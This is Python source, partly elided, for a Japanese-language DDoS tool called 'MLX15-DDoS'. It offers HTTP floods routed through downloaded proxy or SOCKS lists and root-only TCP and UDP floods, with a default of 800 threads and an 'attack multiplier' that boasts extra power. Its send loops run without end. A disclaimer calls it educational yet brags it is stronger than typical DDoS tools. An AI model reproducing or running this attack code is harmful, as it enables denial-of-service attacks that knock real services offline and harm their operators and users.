#このツールは教育目的で作成されたものです、ですがその辺のDDoSツールより強力な攻撃力を持っているので悪用はしないでください。
import socket
import socks
import threading
import random
...
if sys.platform.startswith("linux"): 
	...
	print ("MLX15-DDoS") 
os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " & cls & title Download: github.com/MLX15-DDoS")
print('''
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒
...
████████████████████████████████████████████
Github@MLX15
このツールは教育目的や合法なテスト目的で作成されたものです、ですがその辺のDDoSツールより強力な攻撃力を持っているので悪用はしないでください。
またいかなる損害が出ても作成者は一切の責任を負いません。自己責任で管理,使用してください。
	''') 
...
def floodmode():
	global choice1
	choice1 = input("HTTPフラッド「0」（Root権限必要なし）、TCPフラッド「1」またはUDPフラッド「2」を実行しますか？ ")
	if choice1 == "0":
		proxymode()
	elif choice1 == "1":
		try:
			if os.getuid() != 0: 
				print("TCP/UDP攻撃を使用するには、このプログラムをRootとして実行する必要があります。") 
				exit(0) 
			else: 
				floodport() 
		except:
		...
		try:
			if os.getuid() != 0: 
				print("TCP/UDPフラッディングを使用するには、このプログラムをRootとして実行する必要があります。") 
				exit(0) 
			else: # 
				floodport() 
		except:
...
def proxymode():
	global choice2
	choice2 = input("攻撃プロキシをSocksモードにしますか？'y'と入力してください: ")
	if choice2 == "y":
		choiceproxysocks()
	else:
		numthreads()
...
def choiceproxysocks():
	global choice3
	choice3 = input("Proxyモードを有効にするには「0」と入力するか、Socksモードを有効にするには「1」と入力します: ")
	if choice3 == "0":
		choicedownproxy()
	elif choice3 == "1":
		choicedownsocks()
...
def choicedownproxy():
	choice4 = input("新しい攻撃用Proxyリストをダウンロードしますか？'y'と入力: ")
	if choice4 == "y":
		choicemirror1()
	else:
		proxylist()
...
def choicedownsocks():
	choice4 = input("Socksの新しいリストをダウンロードしますか？'y'と入力: ")
	if choice4 == "y":
		choicemirror2()
	else:
		proxylist()
...
def choicemirror1():
	global urlproxy
	choice5 = input ("ダウンロード元：free-proxy-list.net='0'(おすすめ)　またはinforge.net='1' ")
	if choice5 == "0":
...
def choicemirror2():
	global urlproxy
	choice5 = input ("ダウンロード元：socks-proxy-list.net='0'(おすすめ) またはinforge.net = '1'")
	if choice5 == "0":
...
def proxylist():
	global proxies
	out_file = str(input("プロキシリストのファイル名/パスを入力してください(proxy.txt): "))
	if out_file == "":
		out_file = "proxy.txt"
...
def numthreads():
	...
	try:
		...
		threads = 800
		print ("800スレッドが選択されました。\n")
	multiplication()

def multiplication():
	global multiple
	try:
		multiple = int(input("攻撃の乗算数を挿入[（1-5=通常）（50=強力）（100以上=超強力(負荷も高い)）］: "))
	except ValueError:
		print("⚠入力ミスがあります。もう一度やり直してください\n")
		multiplication()
	begin()
...
def begin():
	choice6 = input("Enterを押して攻撃を開始します(本当によろしいですか？): ")
	if choice6 == "":
		loop()
	...
	def run(self): 
		...
		while True:
			try:
				...
				s.send(p) 
				print ("[!] MLX15-DDoS | AttackProxy @ " + str(proxy[0]+"=> ["+proxy[1]) + " ]", self.counter) 
				try: 
	...
	def run(self): 
		...
		while True: 
			try: 
				...
				s.connect((str(url2),int(port))) 
				s.send(p) 
				print ("[!] MLX15-DDoS | AttackProxy @ ", self.counter) 
				try: 
					for y in range(multiple): 
						s.send(str.encode(p)) 
				except: 
